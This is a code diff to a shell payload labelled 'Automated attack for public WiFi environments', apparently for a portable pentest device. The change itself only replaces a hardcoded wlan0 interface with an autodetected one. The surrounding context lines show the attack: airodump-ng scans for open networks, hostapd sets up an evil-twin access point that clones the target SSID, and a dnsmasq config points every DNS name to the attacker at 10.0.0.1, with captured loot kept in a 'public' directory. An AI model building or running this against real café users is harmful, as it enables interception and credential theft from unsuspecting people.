@@ -4,6 +4,11 @@
 # Description: Automated attack for public WiFi environments
 # Category: nullsec/social
 
+# Autodetect the right wireless interface (exports $IFACE).
+# Falls back to showing the pager error dialog if nothing is plugged in.
+. /root/payloads/library/nullsec-iface.sh 2>/dev/null || . "$(dirname "$0")/../../../lib/nullsec-iface.sh"
+nullsec_require_iface || exit 1
+
 LOOT_DIR="/mmc/nullsec/public"
 mkdir -p "$LOOT_DIR"
 
@@ -19,10 +24,8 @@ public WiFi locations.
 
 Press OK to configure."
 
-[ ! -d "/sys/class/net/wlan0" ] && { ERROR_DIALOG "wlan0 not found!"; exit 1; }
-
 SPINNER_START "Finding open networks..."
-timeout 12 airodump-ng wlan0 --encrypt opn --write-interval 1 -w /tmp/openscan --output-format csv 2>/dev/null
+timeout 12 airodump-ng $IFACE --encrypt opn --write-interval 1 -w /tmp/openscan --output-format csv 2>/dev/null
 SPINNER_STOP
 
 # Find open networks
@@ -156,7 +159,7 @@ LOG "Starting Coffee Shop attack..."
 
 # Start AP
 cat > /tmp/cafe_hostapd.conf << EOF
-interface=wlan0
+interface=$IFACE
 ssid=$TARGET_SSID
 channel=$REAL_CHANNEL
 hw_mode=g
@@ -166,11 +169,11 @@ EOF
 
 hostapd /tmp/cafe_hostapd.conf &
 sleep 2
-ifconfig wlan0 10.0.0.1 netmask 255.255.255.0 up
+ifconfig $IFACE 10.0.0.1 netmask 255.255.255.0 up
 
 # DNS
 cat > /tmp/cafe_dns.conf << EOF
-interface=wlan0
+interface=$IFACE
 dhcp-range=10.0.0.10,10.0.0.200,5m
 address=/#/10.0.0.1
 EOF
